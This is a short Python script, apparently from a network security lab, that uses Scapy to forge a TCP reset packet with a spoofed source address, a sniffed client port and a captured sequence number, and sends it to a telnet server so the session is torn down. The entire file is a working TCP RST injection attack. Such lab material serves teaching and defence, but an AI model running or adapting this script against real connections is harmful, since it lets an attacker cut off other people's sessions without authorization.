#!/usr/bin/env python3

from scapy.all import IP, TCP, send

# Spoofed session parameters
ip = IP(src="10.9.0.6", dst="10.9.0.5")

tcp = TCP(
    sport=50406,   # Client port (captured from sniffing)
    dport=23,      # Telnet port
    flags="R",     # Reset flag
    seq=2585968603 # Correct sequence number
)

packet = ip / tcp

print("Sending TCP RST packet...")

send(packet, verbose=0)
